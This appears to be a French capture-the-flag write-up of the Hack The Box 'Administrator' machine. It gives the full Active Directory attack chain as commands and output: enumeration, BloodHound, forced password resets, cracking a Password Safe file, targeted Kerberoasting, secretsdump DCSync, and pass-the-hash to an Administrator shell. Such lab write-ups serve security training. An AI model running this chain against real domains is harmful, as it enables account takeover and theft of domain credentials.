
---

### 🧭 Étape 1 : **Collecte d’informations (Reconnaissance)**

**Outils utilisés :** `nmap`

#### Commande :

```bash
nmap -sC -sV -oN nmap.txt 10.10.11.42
```
Fichier txt :
```
# Nmap 7.95 scan initiated Wed Apr  2 03:59:09 2025 as: /usr/lib/nmap/nmap -sC -sV -oN nmap.txt 10.10.11.42
Nmap scan report for 10.10.11.42
Host is up (0.024s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-02 14:59:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-02T14:59:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  2 03:59:28 2025 -- 1 IP address (1 host up) scanned in 18.16 seconds
```

**Explication :**

- `-sC` : lance les scripts par défaut (comme un petit scan de vulnérabilités).
- `-sV` : détecte les versions des services.
- `-oN nmap.txt` : enregistre les résultats dans un fichier texte.
- `10.10.11.42` : IP de la machine (à adapter selon ton instance HTB).

**Résultat :**

| Port      | Service  | Description                                                    |
| --------- | -------- | -------------------------------------------------------------- |
| 21        | FTP      | `Microsoft ftpd` – souvent mal configuré                       |
| 88        | Kerberos | Utilisé pour l’authentification AD                             |
| 135       | MSRPC    | Appels de procédure à distance                                 |
| 139, 445  | SMB      | Partages de fichiers – potentiellement juteux                  |
| 389, 3268 | LDAP     | Infos sur les utilisateurs/domaine via AD                      |
| 5985      | WinRM    | Interface d’administration distante HTTP (PowerShell Remoting) |

---
## 🔐 Olivia

On commence la box avec un petit cadeau du créateur : les creds `olivia : ichliebedich`. Classique.

Premier réflexe : je tente un accès FTP vu qu’il y a un port 21 qui traîne. Mais nop, c’est mort direct :

```bash
ftp 10.10.11.42
> login failed, home directory inaccessible
```

Bon, pas grave. 
Je bascule sur le SMB et là… bingo :

```bash
crackmapexec smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
```

Et là je vois que les identifiants passent
Mais pas de share super utile dispo (juste ADMIN$, IPC$, NETLOGON, SYSVOL…). Rien à loot pour l’instant.

Du coup je tente WinRM… et là :

```bash
crackmapexec winrm 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

Connexion directe avec Evil-WinRM :

```bash
evil-winrm -i 10.10.11.42 -u 'olivia' -p 'ichliebedich'
```

Une fois dans la session, je check rapidement les privilèges :

```powershell
whoami /all
```

→ User basique, pas d’accès admin mais quelques droits comme `SeMachineAccountPrivilege`. Rien de fou, mais je prends.

Je liste aussi les users présents sur la machine :

```powershell
net user
```

Et là je vois pas mal de comptes intéressants : `administrator`, `alexander`, `benjamin`, `emily`, `ethan`, `michael`, etc.

Y’a du monde sur ce domaine. Clairement un bon terrain pour lancer **BloodHound** et repérer une escalade possible

## 🎯 Prise de contrôle de Michael

### 🧠 Phase BloodHound

À ce stade, j’suis connecté avec Olivia, j’ai pas de droits de fou, mais y’a moyen de gratter. Je décide donc de sortir : **BloodHound** 🐺

Je balance `bloodhound.py` pour collecter tout ce que je peux sur le domaine :

```bash
bloodhound.py -d administrator.htb -ns 10.10.11.42 -u olivia -p ichliebedich -c All --zip
```

Y’a une erreur sur le ticket Kerberos, mais on s’en fou, il repasse en NTLM derrière. L’important c’est que la collecte passe nickel. À la fin, ça me pond un`.zip` que j’importe dans l’interface BloodHound (via Neo4j, comme d’hab).

---

### 🔍 Analyse dans BloodHound

Je check le node `olivia`, et là je vois un **FDOC** (First Degree Object Control) sur l’utilisateur **michael**.

Et plus précisément, j’ai un droit **GenericAll** sur lui.

---

### 🔄 Changement de mot de passe

Du coup, je reste dans ma session WinRM avec Olivia et je tape direct :

```powershell
net user michael michael /domain
```

Yes sir Le mot de passe de `michael` est maintenant... `michael`. (Ouais j’ai pas fait dans l’originalité, mais ça marche.)
![Cat Table](../../assets/memes/CatTable.png)

---

### ✅ Vérification

Je teste le tout avec `crackmapexec` pour voir si les identifiants passent :

```bash
crackmapexec smb 10.10.11.42 -u 'michael' -p 'michael'
```

Et là, le feu vert :![La Patte de l'expert](../../assets/memes/FeuVert.png)

```
[+] administrator.htb\michael:michael
```

Je viens officiellement de récupérer un nouveau user. 🏆  
Next stop → **benjamin** 🚀


Parfait, voici la suite de ton write-up, toujours dans ton style familier et clair comme de l’eau de roche 😎👇

---

## 🔐 Prise de contrôle de Benjamin

Comme j’ai encore BloodHound sous les yeux, je check le node de **michael**, histoire de voir s’il peut m’ouvrir d’autres portes. Et boum : il a un **FDOC** sur **benjamin** avec le droit **ForceChangePassword**.

🧠 Petit rappel : `ForceChangePassword` = je peux modifier le mot de passe d’un user **sans même avoir besoin de l’ancien**. Ultra pratique.![NerdCat](../../assets/memes/NerdCat.png)


---

### 🔁 Reset du mot de passe via rpcclient

J’ai pas besoin de shell pour ça. Je passe direct par `rpcclient` :

```bash
rpcclient -U michael 10.10.11.42
```

Une fois dedans, je balance :

```bash
setuserinfo2 benjamin 23 'benjamin'
```
🧠 Ici, `23` correspond au niveau de sécurité de l’opération (set password). C’est une vieille astuce avec `rpcclient` pour modifier un mot de passe d’un user sans shell, juste via RPC.![NerdCat](../../assets/memes/NerdCat.png)
 
Je sors de `rpcclient`, et je teste les creds fraîchement créés :

```bash
crackmapexec smb 10.10.11.42 -u 'benjamin' -p 'benjamin'
```

Et là, encore une fois, ça passe :

```
[+] administrator.htb\benjamin:benjamin
```

🔓 Un compte de plus dans la poche !

---

## 📁 FTP avec Benjamin – Objectif : Emily

Bon, je check vite fait sur BloodHound si `benjamin` a des droits intéressants. Mais nada, il est tout claqué.![NerdCat](../../assets/memes/OhHellNah.png)
Par contre, je remarque qu’il est membre du groupe **Share Moderators**, donc je tente sa connexion sur le **FTP**.

```bash
ftp 10.10.11.42
```

Je tape les creds :

```bash
benjamin / benjamin
```

Et c'est carré je suis loggé !

Je liste les fichiers :

```bash
ftp> dir
```

Et je vois un fichier qui attire direct mon attention :

```
Backup.psafe3
```

Un fichier `.psafe3`, donc un fichier **Password Safe v3**… Y’a des chances qu’il contienne des creds.

Je le télécharge :

```bash
ftp 10.10.11.42
   Connected to 10.10.11.42.
   220 Microsoft FTP Service
   Name (10.10.11.42:kali): benjamin
   331 Password required
   Password: 
   230 User logged in.
   Remote system type is Windows_NT.
ftp> dir
   229 Entering Extended Passive Mode (|||54017|)
   125 Data connection already open; Transfer starting.
   10-05-24  09:13AM                  952 Backup.psafe3
   226 Transfer complete.
ftp> get Backup.psafe3
   local: Backup.psafe3 remote: Backup.psafe3
   229 Entering Extended Passive Mode (|||57645|)
   125 Data connection already open; Transfer starting.
   100% |*************************************************************************************************************************************************|   952       10.09 KiB/s    00:00 ETA
   226 Transfer complete.
   WARNING! 3 bare linefeeds received in ASCII mode.
   File may not have transferred correctly.
   952 bytes received in 00:00 (6.76 KiB/s)
```


## 🧠 Récup de Emily via Backup.psafe3

 Je sais que c’est un fichier **Password Safe v3**, et ça veut souvent dire : y’a des creds planqués dedans (en vrai je connaissais pas j'ai du chercher).

Je tente un petit bruteforce avec `hashcat` (mode 5200) et le classique `rockyou.txt` :

```bash
hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```
Et là :

```bash
Backup.psafe3:tekieromucho
```
![Romantico](../../assets/memes/Romantico.png)
Ça sent la vibe romantique ce mot de passe mdrrrr (J'ai leak parce que trop drole)

---

## 📊 BloodHound : Objectif Ethan

Je relance un petit tour dans BloodHound avec ce que j’ai récupéré. Et là je vois qu’**Emily** (dont on vient de récupérer les creds grâce au fichier) a un **GenericWrite** sur l’utilisateur **ethan**.

🧠 Pour rappel : GenericWrite = je peux modifier les attributs du compte (genre, son SPN) → parfait pour un **Kerberoasting**.![NerdCat](../../assets/memes/NerdCat.png)

---

## 🕰️ Sync de l’heure (Kerberos oblige)

Avant toute chose, il faut sync sa machine avec l’heure du DC, sinon Kerberos nous claque la porte au nez (Je parle d'experience j'me suis manger un `Clock Skew`) ![L'homme le plus aigri de France](../../assets/memes/Aigri.png)
:

```bash
sudo ntpdate -u 10.10.11.42
```

---

## 🔥 Kerberoast Ethan

Je balance un targeted kerberoast avec le user emily et son mot de passe (`tekieromucho` ou ce qui en sort du fichier pwsafe décrypté) :

```bash
python3 targetedKerberoast.py -d administrator.htb --dc-ip 10.10.11.42 -u emily -p 'UXLCI5iETUsIBoFVTj8y*****'
```

Et là je récupère un **beau gros hash** bien juteux

Je le crack avec hashcat (mode 13100) :

```bash
hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

Et... **limpb.....** en mot de passe. OK.

---

## 🧪 Dump total avec secretsdump.py

Je tente direct la totale avec `secretsdump.py` :

```bash
python3 secretsdump.py administrator.htb/ethan:limpb****@10.10.11.42
```
🧠 Grâce à ce compte, j’ai accès à la réplication AD (via DRSUAPI), ce qui me permet de récupérer **tous les secrets du domaine**, y compris les hash NTLM de tous les comptes — **même celui d’Administrator**.

Et là... C’est Noël 🎁

Je récupère le hash NTLM de **Administrator** :

```bash
Administrator:500:...:3dc553ce4b9fd20bd016e098******:::
```


## 🏁 Prise de contrôle finale – Administrator

Je peux maintenant me connecter avec **Evil-WinRM** :

```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 3dc553ce4b9fd20bd016e098******
```

Shell Admin. Et la, c'est la fin![Explosion](../../assets/memes/EXPLOSION.png)

Et pour les puristes, je sors aussi l’artillerie old school :

```bash
psexec.py administrator.htb/Administrator@10.10.11.42 -hashes :3dc553ce4b9fd20bd016e098******
```

→ SYSTEM, baby.
![Hackeur](../../assets/memes/HackerMeme.png)
---

## 🧩 Résumé des users / creds

| Utilisateur   | Accès / Mot de passe       | Comment ?                         |
| ------------- | -------------------------- | --------------------------------- |
| olivia        | ichliebedich               | fourni au début                   |
| michael       | michael                    | reset via GenericAll (BloodHound) |
| benjamin      | benjamin                   | ForceChangePassword via michael   |
| emily         | UXLCI5... / depuis .psafe3 | fichier FTP cracké                |
| ethan         | limpb****                  | Kerberoasting depuis Emily        |
| Administrator | hash NTLM                  | secretsdump avec ethan            |
